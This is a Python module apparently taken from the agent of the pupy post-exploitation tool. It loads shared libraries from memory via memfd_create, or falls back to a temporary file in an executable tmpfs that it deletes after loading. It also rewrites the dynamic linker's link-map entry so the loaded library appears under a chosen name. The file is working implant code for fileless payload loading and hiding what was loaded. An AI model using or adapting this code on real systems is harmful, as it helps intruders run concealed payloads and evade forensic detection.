# -*- encoding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

__all__ = ('load_content',)


import os
import ctypes

from io import open

from pupy.agent._linux_memfd import (
    memfd_is_supported, memfd_create
)

from .utils import (
    load_library_common, find_writable_folder, _Py_PackageContext
)

from .posix import _does_dest_allows_executable_mappings


TMP_FOLDERS = ['/dev/shm', '/tmp', '/var/tmp']
RTLD_DI_LINKMAP = 2

SELF = ctypes.CDLL(None)

try:
    dlinfo = SELF.dlinfo
    dlinfo.argtypes = (
        ctypes.c_void_p, ctypes.c_int, ctypes.c_void_p
    )

except AttributeError:
    dlinfo = None

strdup = SELF.strdup
strdup.argtype = [ctypes.c_char_p]
strdup.restype = ctypes.c_char_p


try:
    for mount in open('/proc/self/mounts'):
        _, dest, fstype, opts, _, _ = mount.split()
        opts = tuple(opts.split(','))
        if 'noexec' in opts or 'ro' in opts:
            continue

        if 'tmpfs' in fstype and dest not in TMP_FOLDERS:
            TMP_FOLDERS.insert(0, dest)

except OSError:
    pass


class LibName(ctypes.Structure):
    _fields_ = (
        ('l_name', ctypes.c_char_p),
        ('next', ctypes.c_void_p),
        ('dont_free', ctypes.c_int)
    )


class DlMapPrivate(ctypes.Structure):
    _fields_ = (
        ('l_addr', ctypes.c_void_p),
        ('l_name', ctypes.c_char_p),
        ('l_ld', ctypes.c_void_p),
        ('l_next', ctypes.c_void_p),
        ('l_prev', ctypes.c_void_p),
        ('l_real', ctypes.c_void_p),
        ('l_ns', ctypes.c_long),
        ('l_libname', ctypes.POINTER(LibName)),
    )


def _change_dlname(lib, new_name):
    lm = ctypes.POINTER(DlMapPrivate)()
    if dlinfo(lib._handle, RTLD_DI_LINKMAP, ctypes.byref(lm)) != 0:
        raise ValueError('dlinfo({}) failed'.format(lib._handle))

    load_path = lib._name.encode('utf8')
    lib_name = os.path.basename(load_path)

    if lm.contents.l_ns != 0:
        raise ValueError('dlinfo: unexpected LMID: {}'.format(lm.contents.l_ns))

    if lm.contents.l_libname.contents.l_name != lib_name and \
            lm.contents.l_libname.contents.l_name != load_path:
        raise ValueError('dlinfo: unexpected library name: {} != {} (or {})'.format(
            lm.contents.l_libname.contents.l_name, lib_name, load_path))

    lm.contents.l_name = strdup(new_name)
    lm.contents.l_libname.contents.l_name = strdup(new_name)


if _Py_PackageContext is not None and dlinfo is not None and memfd_is_supported():
    def load_content(content, name, dlopen=False, initfuncname=None):
        fd, filepath = memfd_create()
        try:
            return load_library_common(
                fd, filepath, content, name, dlopen, initfuncname,
                _change_dlname
            )
        finally:
            fd.close()

else:
    import tempfile

    DROP_DIR = find_writable_folder(
        TMP_FOLDERS, validate=_does_dest_allows_executable_mappings
    )

    def load_content(content, name, dlopen=False, initfuncname=None):
        fd, filepath = tempfile.mkstemp(dir=DROP_DIR)
        fobj = os.fdopen(fd, 'wb')
        try:
            return load_library_common(
                fobj, filepath, content, name, dlopen, initfuncname
            )
        finally:
            os.unlink(filepath)
            fobj.close()
